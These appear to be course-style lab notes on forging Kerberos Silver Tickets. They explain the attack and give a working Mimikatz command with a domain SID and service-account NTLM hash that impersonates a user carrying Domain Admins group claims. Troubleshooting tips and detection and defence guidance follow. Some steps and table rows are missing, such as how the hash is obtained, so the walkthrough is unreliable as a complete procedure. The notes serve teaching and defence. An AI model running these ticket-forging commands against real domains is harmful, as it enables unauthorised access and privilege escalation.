## Overview

A **Silver Ticket** is a forged Kerberos service ticket.

Unlike a normal Kerberos service ticket, a Silver Ticket is created by the attacker using the password hash of the account that owns the target SPN.

If the forged ticket is accepted by the target service, it can allow access to that service as an arbitrary domain user, without knowing that user’s password.

```text
Service account hash
+
Domain SID
+
Target SPN
=
Forged service ticket
```

> [!important]
> Silver Tickets are service-specific. They are forged for a specific SPN, such as `HTTP/web04.corp.com`, `CIFS/files04.corp.com`, or another Kerberos-backed service.

---

# Kerberos Refresher

When a user accesses a service using Kerberos:

```text
1. User authenticates to the domain.
2. User requests a service ticket for an SPN.
3. Domain controller creates a TGS.
4. The TGS is encrypted with the password hash of the SPN account.
5. User presents the TGS to the service.
6. The service decrypts and validates the ticket.
```

The important detail:

```text
The target service trusts the ticket because it can decrypt it with its own service account key.
```

If an attacker knows the service account hash, they can forge a ticket that the service can decrypt.

---

# Why Silver Tickets Work

The service ticket contains information about:

```text
username
domain
group memberships
privileges
target service
ticket lifetime
```

In many environments, the target service does not fully validate the ticket’s user and group information with the domain controller.

Instead, the service often trusts the ticket because:

```text
the ticket is encrypted with the service account hash
only the domain controller and service account should know that hash
```

This can allow an attacker to forge:

```text
a ticket for a chosen user
with chosen group memberships
for a chosen service
```

# PAC Validation

## What Is PAC?

PAC stands for:

```text
Privilege Attribute Certificate
```

The PAC stores authorization information inside Kerberos tickets.

It may include:

```text
user SID
group SIDs
privileges
logon information
authorization data
```

---

## PAC Validation

PAC validation is an optional process where the service checks the PAC with the domain controller.

If PAC validation is performed:

```text
the service asks the domain controller to verify the ticket authorization data
```

If PAC validation is not performed:

```text
the service may trust the PAC in the ticket directly
```

Silver Tickets rely on the fact that many services do not perform full PAC validation.

> [!note]
> Service applications rarely perform PAC validation in many environments, which is why Silver Tickets can be effective.

---

# Silver Ticket vs Golden Ticket

| Ticket Type | Requires | Scope |
|---|---|---|
| Silver Ticket | Service account hash | Specific service / SPN |
| Golden Ticket | `krbtgt` hash | Broad domain Kerberos ticketing |

Plain English:

```text
Silver Ticket = forged ticket for one service.
Golden Ticket = forged TGT for the domain.
```

Silver Tickets are more limited, but may be quieter because they can avoid direct domain controller interaction during use.

To forge a Silver Ticket, collect:

```text

Target SPN
```

In the lab example:

| Required Item | Example |
|---|---|

| Domain SID | `S-1-5-21-1987370270-658905905-1781884369` |
| Target SPN | `HTTP/web04.corp.com` |

# Example Scenario

Target service account:

```text
iis_service
```

Target SPN:

```text
HTTP/web04.corp.com:80
```

Target service:

```text
IIS web application on WEB04
```

Current user:

```text
jeff
```

Current user password:

```text
HenchmanPutridBonbon11
```

Assumption:

```text
iis_service has an established session on CLIENT75
jeff is local administrator on CLIENT75
```

Goal:

```text
Forge an HTTP service ticket to access WEB04 as jeffadmin.
```

# Step 1 – Confirm Current User Cannot Access Service

From PowerShell as `jeff`:

```powershell
iwr -UseDefaultCredentials http://web04
```

Expected failure:

```text
401 - Unauthorized: Access is denied due to invalid credentials.
```

Interpretation:

```text
jeff cannot access the web resource with current credentials.
```

# Step 3 – Obtain the Domain SID

Run:

```cmd
whoami /user
```

Example output:

```text
USER INFORMATION
----------------

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
```

The full SID contains:

```text
Domain SID + RID
```

Full user SID:

```text
S-1-5-21-1987370270-658905905-1781884369-1105
```

Domain SID only:

```text
S-1-5-21-1987370270-658905905-1781884369
```

Remove the final RID:

```text
-1105
```

This is the second required Silver Ticket component.

---

# Step 4 – Identify the Target SPN

Target web service:

```text
HTTP/web04.corp.com:80
```

For Mimikatz Silver Ticket creation, split this into:

```text
/service:http
/target:web04.corp.com
```

This is the third required Silver Ticket component.

---

# Step 5 – Forge and Inject the Silver Ticket

Use Mimikatz:

```text
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

Options:

| Option | Meaning |
|---|---|
| `kerberos::golden` | Mimikatz module for forging Golden and Silver Tickets |
| `/sid:` | Domain SID |
| `/domain:` | Domain name |
| `/ptt` | Pass-the-ticket; inject ticket into current session |
| `/target:` | Host where the target SPN runs |
| `/service:` | SPN service type |
| `/rc4:` | NTLM hash of the SPN account |
| `/user:` | Username to place inside the forged ticket |


```text
The forged service ticket was accepted.
```

> This access was achieved without knowing the plaintext password or password hash of `jeffadmin`.

# Why the Forged User Can Be Arbitrary

In the example, the forged ticket uses:

```text
/user:jeffadmin
```

The service sees the ticket as belonging to:

```text
jeffadmin
```

However, the attacker does not need `jeffadmin`'s password or hash.

The key requirement is:

```text
the hash of the service account that owns the SPN
```

In this case:

```text
iis_service NTLM hash
```

---

# Group Memberships in the Forged Ticket

The Mimikatz output includes:

```text
Groups Id : *513 512 520 518 519
```

Example important RIDs:

| RID | Group |
|---:|---|
| `513` | Domain Users |
| `512` | Domain Admins |
| `518` | Schema Admins |
| `519` | Enterprise Admins |
| `520` | Group Policy Creator Owners |

Plain English:

```text
The forged PAC claims the user belongs to highly privileged groups.
```

If the service trusts the PAC without validation, it may grant access accordingly.

---

# Scope of Silver Tickets

A Silver Ticket is scoped to:

```text
one service type
one target host
one service account key
```

Example:

```text
http/web04.corp.com
```

This ticket should work for:

```text
HTTP service on WEB04
```

It should not automatically work for unrelated services such as:

```text
cifs/files04.corp.com
ldap/dc1.corp.com
mssql/sql01.corp.com
```

Unless the same service account/SPN configuration supports those targets.

---

## SPN Reuse Across Servers

If the same SPN account is used across multiple services or servers, a forged ticket may be useful against multiple resources.

Example:

```text
same service account owns HTTP SPNs on several web servers
```

Potential impact:

```text
one service account hash may unlock multiple SPN-backed services
```

# Troubleshooting

## Ticket Injected but Access Still Denied

Check:

```text
SPN service type is correct
target hostname matches SPN
using FQDN vs short name consistently
ticket is in current logon session
service uses Kerberos, not NTLM only
SPN hash is correct
service account actually owns the SPN
PAC validation may be enabled
browser/tool is using default credentials
```

Try:

```cmd
klist
```

Confirm ticket server:

```text
http/web04.corp.com
```

---

## Wrong Target Name

If the ticket is for:

```text
http/web04.corp.com
```

but you access:

```text
http://web04
```

Kerberos SPN matching may fail in some cases.

Try using the FQDN:

```powershell
iwr -UseDefaultCredentials http://web04.corp.com
```

---

## `privilege::debug` Fails

Possible causes:

```text
PowerShell is not elevated
user is not local admin
LSA Protection enabled
Credential Guard enabled
EDR/AV blocking LSASS access
```

---

## No Service Account Hash in LSASS

Possible causes:

```text
service account does not have a session on the host
service is not running under that account on the host
Credential Guard or LSASS protection prevents extraction
wrong machine
session ended
```

Alternative source:

```text
hash cracked through Kerberoasting
hash obtained through other authorized credential access path
```

# Detection and Defensive Notes

## Detection Opportunities

Silver Ticket activity may involve:

```text
Mimikatz execution
LSASS credential extraction
SeDebugPrivilege usage
forged Kerberos ticket injection
unusual ticket lifetime
service access without matching DC TGS request
suspicious PAC group memberships
RC4-HMAC ticket usage
access to service from unusual user/host
```

Potential indicators:

```text
service accepts ticket but DC has no corresponding TGS request
ticket lifetime is abnormally long
forged user has unusual group claims
Mimikatz kerberos::golden command
klist shows unusual tickets
```

---

## Defensive Controls

Reduce Silver Ticket risk by:

```text
protecting service account hashes
using gMSA where possible
using long random service account passwords
rotating service account passwords
limiting service account logons
avoiding service account sessions on workstations
enabling PAC validation where feasible
monitoring service ticket anomalies
monitoring LSASS access
enabling LSA Protection
using Credential Guard
disabling RC4 where possible
reviewing SPN ownership
```

# PAC_REQUESTOR Patch Note

Microsoft introduced updates to the PAC structure related to:

```text
PAC_REQUESTOR
```

Purpose:

```text
validate the requesting user more strictly
reduce forged ticket abuse involving non-existent users
```

Enforcement date referenced in the notes:

```text
October 11, 2022
```

Important impact:

```text
With the update enforced, forging tickets for non-existent domain users is mitigated when the client and KDC are in the same domain.
```

Practical takeaway:

```text
Use an existing domain user in forged-ticket lab examples.
```

# Silver Ticket vs Kerberoasting

| Technique | Goal | Requires |
|---|---|---|
| Kerberoasting | Crack service account password | TGS-REP hash for SPN account |
| Silver Ticket | Forge service ticket | Service account hash |

Relationship:

```text
Kerberoasting may recover the service account password.
The password can be converted to an NTLM hash.
The NTLM hash can be used to forge Silver Tickets.
```

---

# Key Takeaways

- Silver Tickets are forged Kerberos service tickets.
- They require the password hash of the account that owns the target SPN.
- Required inputs are the SPN hash, domain SID, and target SPN.
- Silver Tickets are service-specific.
- Mimikatz uses `kerberos::golden` to create both Golden and Silver Tickets.
- `/service:` and `/target:` define the service-specific Silver Ticket target.
- `/ptt` injects the forged ticket into the current session.
- `klist` confirms whether the ticket is loaded.
- The forged ticket can claim arbitrary users and group memberships.
- The target service may accept the ticket if PAC validation is not enforced.
- Silver Tickets can grant access without the impersonated user’s password.
- Protecting service account hashes is critical.
- Use managed service accounts or gMSAs where possible.
- Monitor for suspicious tickets, LSASS access, and abnormal service access.
